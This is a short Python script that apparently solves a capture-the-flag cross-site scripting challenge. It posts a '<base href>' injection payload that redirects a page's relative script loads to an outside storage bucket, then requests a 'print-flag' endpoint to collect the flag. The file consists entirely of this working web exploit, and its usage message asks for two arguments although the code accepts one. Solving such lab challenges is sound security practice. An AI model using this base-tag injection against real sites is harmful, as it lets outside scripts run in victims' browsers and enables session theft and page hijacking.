import sys
import requests 

url = "https://us-west1-corgi-test.cloudfunctions.net"
bucket_url = "https://storage.googleapis.com/corgi-test-bucket/"

if len(sys.argv) != 2:
    print("Please specify challenge URL and request bin URL")
    print("python solution.py <challenge-url>")
else:  
	vector = '<base href="' + bucket_url + '">'
	param = {'payload':vector}
	response = requests.post(sys.argv[1] + '/xss-two-result', data=param)
	print("Response as non-Admin")
	print(response.text)
	print("Response as Admin")
	response = requests.get('https://us-west1-corgi-test.cloudfunctions.net/print-flag')
	print(response.text)
